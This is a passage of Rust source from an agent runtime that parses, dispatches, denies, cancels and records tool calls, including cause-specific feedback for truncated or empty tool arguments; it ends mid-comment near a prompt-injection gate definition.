use std::sync::Arc;

use futures::stream::{FuturesUnordered, StreamExt};

use crate::stdlib::json_to_vm_value;
use crate::stdlib::macros::harn_builtin;
use crate::value::{VmError, VmValue};

use super::agent_runtime::{current_agent_session_id, current_host_bridge};
use super::{
    agent_runtime, agent_session_host, agent_tools, compass_router, helpers, permissions, tools,
};

#[derive(Clone)]
struct CapturingAgentEventSink {
    session_id: String,
    events: Arc<std::sync::Mutex<Vec<crate::agent_events::AgentEvent>>>,
}

thread_local! {
    static FALLBACK_TEXT_TOOL_CALL_SEQ: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

impl crate::agent_events::AgentEventSink for CapturingAgentEventSink {
    fn handle_event(&self, event: &crate::agent_events::AgentEvent) {
        if event.session_id() != self.session_id {
            return;
        }
        if let Ok(mut events) = self.events.lock() {
            events.push(event.clone());
        }
    }
}

/// Capture agent events emitted while executing a Harn closure.
#[harn_builtin(
    sig = "__host_agent_capture_events(session_id: string, body: closure) -> dict",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_agent_capture_events_impl(
    ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    let session_id = match args.first() {
        Some(VmValue::String(text)) if !text.is_empty() => text.to_string(),
        Some(VmValue::String(_)) => {
            return Err(VmError::Runtime(
                "__host_agent_capture_events(session_id, body): session_id must be non-empty"
                    .to_string(),
            ))
        }
        Some(other) => {
            let type_name = other.type_name();
            return Err(VmError::Runtime(format!(
                "__host_agent_capture_events(session_id, body): session_id must be a string; got {type_name}"
            )));
        }
        None => {
            return Err(VmError::Runtime(
                "__host_agent_capture_events(session_id, body): missing session_id".to_string(),
            ))
        }
    };
    let body = match args.get(1) {
        Some(VmValue::Closure(closure)) => closure.clone(),
        _ => {
            return Err(VmError::Runtime(
                "__host_agent_capture_events(session_id, body): body must be a closure".to_string(),
            ))
        }
    };

    let captured_events = Arc::new(std::sync::Mutex::new(Vec::new()));
    let sink: Arc<dyn crate::agent_events::AgentEventSink> = Arc::new(CapturingAgentEventSink {
        session_id,
        events: captured_events.clone(),
    });
    let _guard = agent_runtime::LoopSinkGuard::install(Some(sink));
    let mut child_vm = ctx.child_vm();
    let result = child_vm.call_closure_pub(&body, &[]).await;
    let output = child_vm.take_output();
    ctx.forward_output(&output);
    let result = result?;
    let events = captured_events
        .lock()
        .map(|events| {
            events
                .iter()
                .map(|event| serde_json::to_value(event).unwrap_or(serde_json::Value::Null))
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    let mut envelope = crate::value::DictMap::new();
    envelope.insert(crate::value::intern_key("result"), result);
    envelope.insert(
        crate::value::intern_key("events"),
        json_to_vm_value(&serde_json::Value::Array(events)),
    );
    Ok(VmValue::dict(envelope))
}

fn agent_primitive_tools_arg(
    args: &[VmValue],
    index: usize,
    label: &str,
) -> Result<Option<VmValue>, VmError> {
    match args.get(index) {
        Some(VmValue::Nil) | None => Ok(crate::stdlib::tools::current_tool_registry()),
        Some(VmValue::Dict(_)) => Ok(args.get(index).cloned()),
        Some(other) => Err(VmError::Runtime(format!(
            "{label}: tools must be a tool registry dict or nil; got {}",
            other.type_name()
        ))),
    }
}

fn agent_primitive_tools_value_arg(
    value: Option<VmValue>,
    label: &str,
) -> Result<Option<VmValue>, VmError> {
    match value {
        Some(VmValue::Nil) | None => Ok(crate::stdlib::tools::current_tool_registry()),
        Some(value @ VmValue::Dict(_)) => Ok(Some(value)),
        Some(other) => Err(VmError::Runtime(format!(
            "{label}: tools must be a tool registry dict or nil; got {}",
            other.type_name()
        ))),
    }
}

fn agent_primitive_options_value_arg(
    value: Option<VmValue>,
    label: &str,
) -> Result<crate::value::DictMap, VmError> {
    match value {
        Some(VmValue::Dict(options)) => {
            Ok(Arc::try_unwrap(options).unwrap_or_else(|options| options.as_ref().clone()))
        }
        Some(VmValue::Nil) | None => Ok(crate::value::DictMap::new()),
        Some(other) => Err(VmError::Runtime(format!(
            "{label}: options must be a dict or nil; got {}",
            other.type_name()
        ))),
    }
}

fn agent_primitive_option_str(options: &crate::value::DictMap, key: &str) -> Option<String> {
    match options.get(key)? {
        VmValue::Nil => None,
        value => Some(value.display()),
    }
}

fn agent_primitive_option_int(options: &crate::value::DictMap, key: &str) -> Option<i64> {
    options.get(key)?.as_int()
}

/// Append a `PermissionGrant` / `PermissionDeny` / `PermissionEscalation`
/// event to the live transcript for the named session, when one exists.
/// Silent no-op for sessions that haven't been opened (e.g. raw
/// dispatcher calls outside an agent loop).
fn emit_permission_event(
    session_id: &str,
    kind: &str,
    tool_name: &str,
    tool_args: &serde_json::Value,
    reason: &str,
    escalated: bool,
) {
    emit_permission_event_with_policy(
        session_id, kind, tool_name, tool_args, reason, escalated, None,
    );
}

fn emit_permission_event_with_policy(
    session_id: &str,
    kind: &str,
    tool_name: &str,
    tool_args: &serde_json::Value,
    reason: &str,
    escalated: bool,
    policy_decision: Option<serde_json::Value>,
) {
    if !crate::agent_sessions::exists(session_id) {
        return;
    }
    let event = if let Some(policy_decision) = policy_decision {
        permissions::permission_transcript_event_with_policy(
            kind,
            tool_name,
            tool_args,
            reason,
            escalated,
            Some(policy_decision),
        )
    } else {
        permissions::permission_transcript_event(kind, tool_name, tool_args, reason, escalated)
    };
    let _ = crate::agent_sessions::append_event(session_id, event);
}

fn agent_primitive_denied_tool(
    tool_name: &str,
    tool_call_id: &str,
    tool_args: &serde_json::Value,
    reason: impl Into<String>,
    category: crate::agent_events::ToolCallErrorCategory,
    denial: Option<&crate::agent_events::ToolDenial>,
    resolved_repair: Option<serde_json::Value>,
) -> serde_json::Value {
    let reason = reason.into();
    // Recoverable argument failures coach a corrected retry; hard denials do not.
    // Tool ceilings are name resolution: repair unique calls or list callable names.
    let retryable_denial = denial.is_some_and(|denial| denial.retryable);
    let tool_ceiling_denial =
        denial.is_some_and(|denial| denial.gate == crate::agent_events::DenialGate::ToolCeiling);
    // `deny_tool_call` is the sole owner of resolving repairs and normalizing
    // their typed denial. This result builder only projects that contract.
    let denial_json = denial.map(crate::agent_events::ToolDenial::to_json);
    let mut result = if let Some(repair) = resolved_repair {
        repair
    } else if category.is_recoverable() || retryable_denial {
        agent_tools::recoverable_tool_result(tool_name, reason.clone())
    } else if tool_ceiling_denial {
        agent_tools::unavailable_tool_result(tool_name, reason.clone())
    } else {
        agent_tools::denied_tool_result(tool_name, reason.clone())
    };
    // Mirror the denial into the result and envelope. A successful name repair
    // makes both copies retryable, matching the corrected next step.
    if let Some(denial_json) = denial_json.clone() {
        if let Some(obj) = result.as_object_mut() {
            obj.insert("denial".to_string(), denial_json);
        }
    }
    let rendered = agent_tools::render_tool_result(&result);
    let observation = format!("[result of {tool_name}]\n{rendered}\n[end of {tool_name} result]\n");
    serde_json::json!({
        "ok": false,
        "status": "error",
        "tool_name": tool_name,
        "tool_call_id": tool_call_id,
        "arguments": tool_args,
        "result": result,
        "rendered_result": rendered,
        "observation": observation,
        "error": reason,
        "error_category": category.as_str(),
        "mutation_status": crate::agent_events::ToolMutationStatus::NotApplied.as_str(),
        "denial": denial_json,
        "executor": null,
    })
}

/// Cause-named feedback for a tool call whose arguments failed validation
/// because of an argument-DELIVERY fault — the model authored a real call, but
/// what reached dispatch is not what it wrote. Two classes, both of which the
/// generic "missing required parameter(s): path" message misdiagnoses as a
/// model slip and sends into re-call loops:
///
/// 1. A `{"__parse_error": "..."}` carrier — the streamed-argument parser
///    could not reassemble the call. Split on the parser diagnostic
///    (`parse_error_carrier_feedback`): a truncation (`EOF while parsing` /
///    `unexpected end of input`) coaches a smaller re-issue; any other parse
///    fault coaches a clean re-issue as valid JSON.
/// 2. EMPTY arguments (`{}` or null). Observed live on the OpenAI-compatible
///    native tool-call route (an IDE host bug report): 13/165 edit calls
///    arrived with literally `{}` arguments while the model generated
///    549–5,056 output tokens those turns — the model authored content, but
///    the provider boundary delivered an empty-args call. Keyed off the turn's
///    provider stop reason: length truncation (`length` / `max_tokens` /
///    `MAX_TOKENS`) coaches a smaller re-issue; anything else is a
///    provider/template drop coaching an identical re-issue with full args.
///
/// Returns `None` when the arguments were delivered intact (non-empty, no
/// carrier), so ordinary validation failures keep the precise
/// missing-parameter message. The `&'static str` is a machine-readable cause
/// (`arguments_truncated` / `arguments_malformed` / `empty_arguments_truncated`
/// / `empty_arguments_dropped`) exposed on the dispatch envelope so hosts can
/// distinguish the class without string-matching the reason.
fn arg_delivery_fault_feedback(
    tool_name: &str,
    raw_args: &serde_json::Value,
    stop_reason: Option<&str>,
) -> Option<(String, &'static str)> {
    // A `{"__parse_error": "..."}` carrier is the streamed-argument parser's
    // signal that it could NOT reassemble the tool call's arguments and handed
    // dispatch a placeholder instead of what the model authored (see
    // `parse_openai_streamed_tool_argument_values` /
    // `parse_anthropic_streamed_tool_input`). Left alone it fails required-arg
    // validation and reports the misdiagnosing "missing required parameter:
    // path" — a lie, because the model DID write `path`; the stream was cut
    // mid-value or the arguments were not valid JSON. This is the non-empty
    // sibling of the empty-args fault below, so it is named here before the
    // emptiness check (which the carrier object would otherwise fall through).
    // Observed live on llamacpp qwen3.6-35b: a truncated `edit(create)` carrier
    // spun 21 llm calls to an idle turn with no reply.
    if let serde_json::Value::Object(map) = raw_args {
        if let Some(parse_error) = map.get("__parse_error").and_then(|v| v.as_str()) {
            return Some(parse_error_carrier_feedback(tool_name, parse_error));
        }
    }
    let args_empty = match raw_args {
        serde_json::Value::Null => true,
        serde_json::Value::Object(map) => map.is_empty(),
        _ => false,
    };
    if !args_empty {
        return None;
    }
    if agent_session_host::is_length_truncation(stop_reason) {
        Some((
            format!(
                "Tool '{tool_name}' arrived with EMPTY arguments because the response hit \
                 the output-token limit (finish_reason=length): your tool call's arguments \
                 were TRUNCATED by the output limit. Re-issue the call with shorter \
                 content, or split the change into several smaller calls."
            ),
            "empty_arguments_truncated",
        ))
    } else {
        Some((
            format!(
                "Tool '{tool_name}' arrived with EMPTY arguments — a known \
                 provider/template fault where the arguments you authored are dropped at \
                 the provider boundary, not a formatting mistake on your part. Re-issue \
                 the same call with its full arguments."
            ),
            "empty_arguments_dropped",
        ))
    }
}

/// Cause-named feedback for a tool call whose arguments could not be parsed and
/// arrived as a `{"__parse_error": "..."}` carrier. Splits on the parser
/// diagnostic:
///
/// - a TRUNCATION (`EOF while parsing` / `unexpected end of input`): the
///   streamed arguments were cut off mid-value — the model authored a valid
///   call, but the response ended before the arguments finished. Coach a
///   smaller re-issue, exactly like the length-truncation empty-args case; the
///   parser diagnostic is the authoritative signal here because the provider
///   often does NOT flag this with `finish_reason=length` (observed on
///   llamacpp: the stream stops mid-tool-call with a clean stop reason).
/// - anything else (unquoted keys, trailing garbage, wrong dialect): a genuine
///   formatting fault. Coach a clean re-issue as valid JSON. This is the
///   negative control — a malformed call is NEVER silently accepted or
///   mislabeled as a recoverable truncation.
fn parse_error_carrier_feedback(tool_name: &str, parse_error: &str) -> (String, &'static str) {
    if parse_error_is_truncation(parse_error) {
        (
            format!(
                "Tool '{tool_name}' arguments could NOT be parsed because the tool call was \
                 TRUNCATED mid-stream — the arguments JSON ended before it was complete. This \
                 is NOT a missing-parameter slip: you did author the arguments, but the \
                 response was cut off before they finished. Re-issue the call with shorter \
                 content, or split the change into several smaller calls so the arguments fit \
                 in one response."
            ),
            "arguments_truncated",
        )
    } else {
        (
            format!(
                "Tool '{tool_name}' arguments could NOT be parsed as valid JSON. Re-issue the \
                 call as one complete, well-formed JSON object with the required parameters."
            ),
            "arguments_malformed",
        )
    }
}

/// True when a streamed-argument `__parse_error` message describes a buffer that
/// ended mid-value — a cut-off stream, not a dialect error. Keys on the two
/// diagnostics the JSON and Harn text-tool parsers emit for an incomplete tail
/// (`serde_json`'s "EOF while parsing ..." and the text-tool "unexpected end of
/// input"), so a truncation is recognized regardless of which parser ran last.
fn parse_error_is_truncation(parse_error: &str) -> bool {
    parse_error.contains("EOF while parsing") || parse_error.contains("unexpected end of input")
}

/// Execution-policy gate for one tool dispatch: the tool/capability/
/// side-effect ceilings plus the per-tool argument allow-lists.
///
/// `policy_machinery_active` is the dispatch fast-path gate (see
/// `host_agent_dispatch_tool_call`): when false, no execution-policy scope is
/// installed, so `enforce_current_policy_for_tool` would return `Ok(())`
/// unconditionally and `enforce_tool_arg_constraints` would iterate the empty
/// constraint list of `CapabilityPolicy::default()` — skipping both is
/// behavior-preserving and avoids building that default policy per call.
fn enforce_dispatch_policies(
    policy_machinery_active: bool,
    tool_name: &str,
    tool_args: &serde_json::Value,
) -> Result<(), crate::orchestration::PolicyDenial> {
    if !policy_machinery_active {
        return Ok(());
    }
    crate::orchestration::enforce_current_policy_for_tool(tool_name)?;
    crate::orchestration::enforce_tool_arg_constraints(
        &crate::orchestration::current_execution_policy().unwrap_or_default(),
        tool_name,
        tool_args,
    )
}

/// Append a `PermissionDeny` transcript event that carries the structured
/// [`crate::agent_events::ToolDenial`] alongside the human-readable reason.
/// Silent no-op for sessions that were never opened.
fn emit_permission_deny_event(
    session_id: &str,
    tool_name: &str,
    tool_args: &serde_json::Value,
    denial: &crate::agent_events::ToolDenial,
    escalated: bool,
    policy_decision: Option<serde_json::Value>,
) {
    if !crate::agent_sessions::exists(session_id) {
        return;
    }
    let event = permissions::permission_deny_transcript_event(
        tool_name,
        tool_args,
        denial,
        escalated,
        policy_decision,
    );
    let _ = crate::agent_sessions::append_event(session_id, event);
}

/// Emit the canonical `PermissionDeny` event/result and fill missing paths from tool annotations.
fn deny_tool_call(
    session_id: &str,
    tool_name: &str,
    tool_call_id: &str,
    tool_args: &serde_json::Value,
    mut denial: crate::agent_events::ToolDenial,
    escalated: bool,
    policy_decision: Option<serde_json::Value>,
    schema_repair: Option<serde_json::Value>,
) -> serde_json::Value {
    let repair = (denial.gate == crate::agent_events::DenialGate::ToolCeiling)
        .then(|| agent_tools::embedded_call_repair_result(tool_name, tool_args).or(schema_repair))
        .flatten();
    denial = tools::normalize_repaired_denial(denial, repair.as_ref());
    if denial.denied_paths.is_empty() {
        denial.denied_paths =
            crate::orchestration::current_tool_declared_paths(tool_name, tool_args);
    }
    emit_permission_deny_event(
        session_id,
        tool_name,
        tool_args,
        &denial,
        escalated,
        policy_decision,
    );
    agent_primitive_denied_tool(
        tool_name,
        tool_call_id,
        tool_args,
        denial.reason.clone(),
        crate::agent_events::ToolCallErrorCategory::PermissionDenied,
        Some(&denial),
        repair,
    )
}

/// Canonical denied result converted for direct dispatch return.
fn deny_tool_call_value(
    session_id: &str,
    tool_name: &str,
    tool_call_id: &str,
    tool_args: &serde_json::Value,
    denial: crate::agent_events::ToolDenial,
    escalated: bool,
    policy_decision: Option<serde_json::Value>,
    schema_repair: Option<serde_json::Value>,
) -> VmValue {
    json_to_vm_value(&deny_tool_call(
        session_id,
        tool_name,
        tool_call_id,
        tool_args,
        denial,
        escalated,
        policy_decision,
        schema_repair,
    ))
}

/// Shared base `tool_result` shape for a call that never produced a real
/// tool outcome. Extended by [`agent_primitive_cancelled_tool`] (preempted
/// in-flight) and [`agent_primitive_undispatched_tool`] (never dispatched at
/// all) so every non-dispatch path records the same transcript shape.
fn agent_primitive_unexecuted_tool_base(
    tool_name: &str,
    tool_call_id: &str,
    tool_args: &serde_json::Value,
    status: &str,
    rendered: String,
    observation: String,
    error_message: String,
) -> serde_json::Value {
    serde_json::json!({
        "ok": false,
        "status": status,
        "tool_name": tool_name,
        "tool_call_id": tool_call_id,
        "arguments": tool_args,
        "result": serde_json::Value::Null,
        "rendered_result": rendered,
        "observation": observation,
        "error": error_message,
        "error_category": crate::agent_events::ToolCallErrorCategory::Cancelled.as_str(),
        "mutation_status": crate::agent_events::ToolMutationStatus::Unknown.as_str(),
    })
}

/// Build the `tool_result` shape used when a call was preempted by
/// `cancel_in_flight_tool_call`. Distinct from `agent_primitive_denied_tool`
/// so the model can tell "user stopped me mid-run" from "the tool errored".
fn agent_primitive_cancelled_tool(
    tool_name: &str,
    tool_call_id: &str,
    tool_args: &serde_json::Value,
    reason: &str,
    executor: Option<serde_json::Value>,
    execution_duration_ms: u64,
    approval_status: Option<&'static str>,
) -> serde_json::Value {
    let rendered = if reason.is_empty() {
        format!("[cancelled in-flight: {tool_name}]")
    } else {
        format!("[cancelled in-flight: {tool_name}] {reason}")
    };
    let observation = format!(
        "[cancelled call to {name}]\n{reason}\n[end of {name} cancellation]\n",
        name = tool_name,
        reason = if reason.is_empty() {
            "cancelled by host"
        } else {
            reason
        },
    );
    let error_message = if reason.is_empty() {
        format!("tool call cancelled in-flight: {tool_name}")
    } else {
        format!("tool call cancelled in-flight: {reason}")
    };
    let mut result = agent_primitive_unexecuted_tool_base(
        tool_name,
        tool_call_id,
        tool_args,
        "cancelled",
        rendered,
        observation,
        error_message,
    );
    if let Some(obj) = result.as_object_mut() {
        obj.insert(
            "executor".to_string(),
            executor.unwrap_or(serde_json::Value::Null),
        );
        obj.insert("approval".to_string(), serde_json::json!(approval_status));
        obj.insert(
            "execution_duration_ms".to_string(),
            serde_json::json!(execution_duration_ms),
        );
        obj.insert("cancelled".to_string(), serde_json::Value::Bool(true));
        obj.insert("cancellation_reason".to_string(), serde_json::json!(reason));
    }
    result
}

/// Build the `tool_result` shape for a call that was persisted as part of an
/// assistant tool_use turn but will never be dispatched — a pre-dispatch
/// interrupt (`status: "interrupted"`), an `agent_await_resumption`
/// suspension (`status: "awaiting_resumption"`), or a sibling call skipped by
/// either (`status: "skipped"`). Mirrors the cancelled-tool shape so hosts
/// and transcripts see one consistent "no real outcome" record.
fn agent_primitive_undispatched_tool(
    tool_name: &str,
    tool_call_id: &str,
    tool_args: &serde_json::Value,
    status: &str,
    reason: &str,
) -> serde_json::Value {
    let rendered = if reason.is_empty() {
        format!("[not dispatched ({status}): {tool_name}]")
    } else {
        format!("[not dispatched ({status}): {tool_name}] {reason}")
    };
    let observation = format!(
        "[call to {name} was not dispatched: {status}]\n{reason}\n[end of {name} non-dispatch notice]\n",
        name = tool_name,
        reason = if reason.is_empty() {
            "the call was never executed"
        } else {
            reason
        },
    );
    let error_message = if reason.is_empty() {
        format!("tool call not dispatched ({status}): {tool_name}")
    } else {
        format!("tool call not dispatched ({status}): {reason}")
    };
    let mut result = agent_primitive_unexecuted_tool_base(
        tool_name,
        tool_call_id,
        tool_args,
        status,
        rendered,
        observation,
        error_message,
    );
    if let Some(obj) = result.as_object_mut() {
        obj.insert(
            "mutation_status".to_string(),
            serde_json::json!(crate::agent_events::ToolMutationStatus::NotApplied.as_str()),
        );
        obj.insert("dispatched".to_string(), serde_json::Value::Bool(false));
        obj.insert("skip_reason".to_string(), serde_json::json!(reason));
    }
    result
}

fn structured_tool_mutation_status(result: &serde_json::Value) -> &'static str {
    let status = result
        .get("mutation_status")
        .and_then(serde_json::Value::as_str);
    match status {
        Some("applied") => crate::agent_events::ToolMutationStatus::Applied.as_str(),
        Some("not_applied") => crate::agent_events::ToolMutationStatus::NotApplied.as_str(),
        _ => crate::agent_events::ToolMutationStatus::Unknown.as_str(),
    }
}

fn structured_tool_changed_paths(result: &serde_json::Value) -> Option<Vec<&str>> {
    let paths = result
        .get("changed_paths")
        .and_then(serde_json::Value::as_array)?
        .iter()
        .filter_map(serde_json::Value::as_str)
        .filter(|path| !path.trim().is_empty())
        .collect();
    Some(paths)
}

#[cfg(test)]
mod structured_tool_mutation_tests {
    use super::{structured_tool_changed_paths, structured_tool_mutation_status};

    #[test]
    fn lifts_only_declared_mutation_outcomes() {
        assert_eq!(
            structured_tool_mutation_status(&serde_json::json!({"mutation_status": "applied"})),
            "applied"
        );
        assert_eq!(
            structured_tool_mutation_status(&serde_json::json!({"mutation_status": "not_applied"})),
            "not_applied"
        );
        for result in [
            serde_json::json!({}),
            serde_json::json!({"mutation_status": "maybe"}),
            serde_json::json!({"mutation_status": 1}),
            serde_json::json!({"mutationStatus": "applied"}),
        ] {
            assert_eq!(structured_tool_mutation_status(&result), "unknown");
        }
    }

    #[test]
    fn lifts_only_nonempty_string_paths() {
        let result = serde_json::json!({
            "changed_paths": ["src/lib.rs", "", 7, "tests/lib.rs"]
        });
        assert_eq!(
            structured_tool_changed_paths(&result),
            Some(vec!["src/lib.rs", "tests/lib.rs"])
        );
        assert!(structured_tool_changed_paths(&serde_json::json!({
            "changed_paths": "src/lib.rs"
        }))
        .is_none());
    }
}

/// Synthesize placeholder tool_results for calls that were persisted as an
/// assistant tool_use turn but will never be dispatched (pre-dispatch
/// interrupt, `agent_await_resumption` suspension). Recording these keeps
/// the transcript well-formed: Anthropic rejects any assistant `tool_use`
/// block without an adjacent `tool_result` on the next call (HTTP 400),
/// which otherwise breaks interrupted or resumed sessions.
#[harn_builtin(
    sig = "__host_agent_undispatched_tool_results(tool_calls: list, status: string, reason: string) -> list",
    category = "agent.host",
    runtime_only = true
)]
fn host_agent_undispatched_tool_results_builtin(
    args: &[VmValue],
    _out: &mut String,
) -> Result<VmValue, VmError> {
    let calls: Vec<VmValue> = match args.first() {
        Some(VmValue::List(items)) => (**items).clone(),
        Some(VmValue::Nil) | None => Vec::new(),
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_agent_undispatched_tool_results(tool_calls, status, reason): tool_calls must be a list; got {}",
                other.type_name()
            )))
        }
    };
    let status = match args.get(1) {
        Some(VmValue::String(text)) if !text.is_empty() => text.to_string(),
        _ => "skipped".to_string(),
    };
    let reason = match args.get(2) {
        Some(VmValue::String(text)) => text.to_string(),
        _ => String::new(),
    };
    let json_str = |call: &serde_json::Value, primary: &str, fallback: &str| -> String {
        call.get(primary)
            .or_else(|| call.get(fallback))
            .and_then(|value| match value {
                serde_json::Value::String(text) => Some(text.clone()),
                serde_json::Value::Null => None,
                // Text-channel call records may carry numeric ids.
                other => Some(other.to_string()),
            })
            .unwrap_or_default()
    };
    let results: Vec<VmValue> = calls
        .iter()
        .map(|call| {
            let call_json = helpers::vm_value_to_json(call);
            let name = json_str(&call_json, "name", "tool_name");
            let id = json_str(&call_json, "id", "tool_call_id");
            let tool_args = call_json
                .get("arguments")
                .or_else(|| call_json.get("tool_args"))
                .filter(|value| value.is_object())
                .cloned()
                .unwrap_or_else(|| serde_json::json!({}));
            json_to_vm_value(&agent_primitive_undispatched_tool(
                &name, &id, &tool_args, &status, &reason,
            ))
        })
        .collect();
    Ok(VmValue::List(Arc::new(results)))
}

fn attach_hook_reminder_audit(
    mut result: serde_json::Value,
    reports: Vec<serde_json::Value>,
) -> serde_json::Value {
    if reports.is_empty() {
        return result;
    }
    let Some(obj) = result.as_object_mut() else {
        return result;
    };
    let audit = obj
        .entry("audit".to_string())
        .or_insert_with(|| serde_json::json!({}));
    if !audit.is_object() {
        *audit = serde_json::json!({});
    }
    if let Some(audit_obj) = audit.as_object_mut() {
        audit_obj.insert(
            "reminders".to_string(),
            serde_json::json!({
                "origin": "tool_hook",
                "lifecycle": reports,
            }),
        );
    }
    result
}

/// Parse model text into normalized agent tool-call records.
///
/// `tool_format` selects the text-channel grammar: `"json"` routes to the
/// fenced-JSON parser, everything else (`"text"`, `"auto"`, nil) uses the
/// canonical tagged/heredoc grammar. `"native"` never reaches a text parser,
/// so it also reads as the tagged grammar (defensive default).
#[harn_builtin(
    sig = "__host_agent_parse_tool_calls(text: string, tools?: dict|nil, tool_format?: string|nil) -> dict",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_agent_parse_tool_calls_impl(
    _ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    let text = match args.first() {
        Some(VmValue::String(text)) => text.to_string(),
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_agent_parse_tool_calls(text, tools?, tool_format?): text must be a string; got {}",
                other.type_name()
            )))
        }
        None => {
            return Err(VmError::Runtime(
                "__host_agent_parse_tool_calls(text, tools?, tool_format?): missing text".to_string(),
            ))
        }
    };
    let tools = agent_primitive_tools_arg(&args, 1, "__host_agent_parse_tool_calls")?;
    let tool_format = match args.get(2) {
        Some(VmValue::String(fmt)) => fmt.to_string(),
        _ => String::new(),
    };
    let format = tools::TextToolFormat::from_option(&tool_format);
    let mut parsed = tools::parse_text_tool_calls_in_format(&text, tools.as_ref(), format);
    tools::stamp_synthetic_tool_call_ids(&mut parsed.calls, next_text_tool_call_seq_for_parse);
    Ok(json_to_vm_value(&serde_json::json!({
        "calls": parsed.calls,
        "tool_calls": parsed.calls,
        "tool_parse_errors": parsed.errors,
        "protocol_violations": parsed.violations,
        "recovered_from_stray_count": parsed.recovered_from_stray_count,
        "prose": parsed.prose,
        "user_response": parsed.user_response,
        "done_marker": parsed.done_marker,
        "canonical_text": parsed.canonical,
    })))
}

fn next_text_tool_call_seq_for_parse() -> u64 {
    if let Some(session_id) = crate::agent_sessions::current_session_id() {
        if let Some(seq) = crate::agent_sessions::next_text_tool_call_seq(&session_id) {
            return seq;
        }
    }
    FALLBACK_TEXT_TOOL_CALL_SEQ.with(|cell| {
        let seq = cell.get();
        cell.set(seq.checked_add(1).unwrap_or(0));
        seq
    })
}

fn agent_primitive_max_concurrent_tools(options: &crate::value::DictMap) -> usize {
    agent_primitive_option_int(options, "_max_concurrent_tools")
        .or_else(|| agent_primitive_option_int(options, "max_concurrent_tools"))
        .unwrap_or(1)
        .max(1) as usize
}

async fn host_agent_dispatch_tool_call_indexed<'a>(
    ctx: crate::vm::AsyncBuiltinCtx,
    index: usize,
    call: VmValue,
    tools: Option<&'a VmValue>,
    options: &'a crate::value::DictMap,
) -> (usize, Result<VmValue, VmError>) {
    (
        index,
        host_agent_dispatch_tool_call(ctx, call, tools, options).await,
    )
}

async fn host_agent_dispatch_tool_batch_capped(
    ctx: crate::vm::AsyncBuiltinCtx,
    calls: Vec<VmValue>,
    tools: Option<&VmValue>,
    options: &crate::value::DictMap,
    cap: usize,
) -> Result<Vec<VmValue>, VmError> {
    let total = calls.len();
    if total == 0 {
        return Ok(Vec::new());
    }

    let slot = cap.max(1).min(total);
    let mut pending = calls.into_iter().enumerate();
    let mut in_flight = FuturesUnordered::new();
    let mut results: Vec<Option<VmValue>> = vec![None; total];

    while in_flight.len() < slot {
        let Some((index, call)) = pending.next() else {
            break;
        };
        in_flight.push(host_agent_dispatch_tool_call_indexed(
            ctx.clone(),
            index,
            call,
            tools,
            options,
        ));
    }

    while let Some((index, result)) = in_flight.next().await {
        results[index] = Some(result?);
        if let Some((next_index, next_call)) = pending.next() {
            in_flight.push(host_agent_dispatch_tool_call_indexed(
                ctx.clone(),
                next_index,
                next_call,
                tools,
                options,
            ));
        }
    }

    Ok(results
        .into_iter()
        .map(|value| value.unwrap_or(VmValue::Nil))
        .collect())
}

/// Dispatch a batch of normalized agent tool calls through the host tool runtime.
#[harn_builtin(
    sig = "__host_agent_dispatch_tool_batch(calls: list, tools?: dict|nil, options?: dict|nil) -> list",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_agent_dispatch_tool_batch_impl(
    ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    let mut args = args.into_iter();
    let calls = match args.next() {
        Some(VmValue::List(calls)) => {
            Arc::try_unwrap(calls).unwrap_or_else(|calls| calls.as_ref().clone())
        }
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_agent_dispatch_tool_batch(calls, tools?, options?): calls must be a list; got {}",
                other.type_name()
            )))
        }
        None => {
            return Err(VmError::Runtime(
                "__host_agent_dispatch_tool_batch(calls, tools?, options?): missing calls"
                    .to_string(),
            ))
        }
    };
    let tools = agent_primitive_tools_value_arg(args.next(), "__host_agent_dispatch_tool_batch")?;
    let options =
        agent_primitive_options_value_arg(args.next(), "__host_agent_dispatch_tool_batch")?;
    let cap = agent_primitive_max_concurrent_tools(&options);
    let results = if cap <= 1 || calls.len() <= 1 {
        let mut results = Vec::with_capacity(calls.len());
        for call in calls {
            results.push(
                host_agent_dispatch_tool_call(ctx.clone(), call, tools.as_ref(), &options).await?,
            );
        }
        results
    } else {
        host_agent_dispatch_tool_batch_capped(ctx, calls, tools.as_ref(), &options, cap).await?
    };

    Ok(VmValue::List(std::sync::Arc::new(results)))
}

/// Resolve a tool's model-visible descriptor (description + inputSchema) from
/// the dispatch catalog, plus the rug-pull `schemaChanged` flag, so the host
/// can render the full tool text at approval time. `None` when the catalog has
/// no usable entry.
fn tool_descriptor_for(tools_val: Option<&VmValue>, tool_name: &str) -> Option<serde_json::Value> {
    let dict = tools_val?.as_dict()?;
    let tools_list = match dict.get("tools") {
        Some(VmValue::List(list)) => list,
        _ => return None,
    };
    for tool in tools_list.iter() {
        let entry = match tool {
            VmValue::Dict(entry) => entry,
            _ => continue,
        };
        if entry.get("name").map(|v| v.display()).as_deref() != Some(tool_name) {
            continue;
        }
        let mut out = serde_json::Map::new();
        if let Some(value) = entry.get("description") {
            out.insert(
                "description".to_string(),
                crate::mcp::vm_value_to_serde(value),
            );
        }
        if let Some(value) = entry.get("inputSchema") {
            out.insert(
                "inputSchema".to_string(),
                crate::mcp::vm_value_to_serde(value),
            );
        }
        if let Some(value) = entry.get("_mcp_server") {
            out.insert(
                "mcpServer".to_string(),
                crate::mcp::vm_value_to_serde(value),
            );
        }
        if matches!(entry.get("_schema_changed"), Some(VmValue::Bool(true))) {
            out.insert("schemaChanged".to_string(), serde_json::Value::Bool(true));
        }
        if out.is_empty() {
            return None;
        }
        return Some(serde_json::Value::Object(out));
    }
    None
}

/// A fired trifecta gate: the human-facing `reason` plus whether an in-context
/// injection verdict drove it (so the decision can carry a `prompt_injection`
/// risk label in addition to `lethal_trifecta`).
struct GateOutcome {
    reason: String,
    injection_flagged: bool,
}

/// The strongest flagged in-context detector score, as a rounded percent, or
/// `None` when no in-context taint was flagged by the injection classifier.
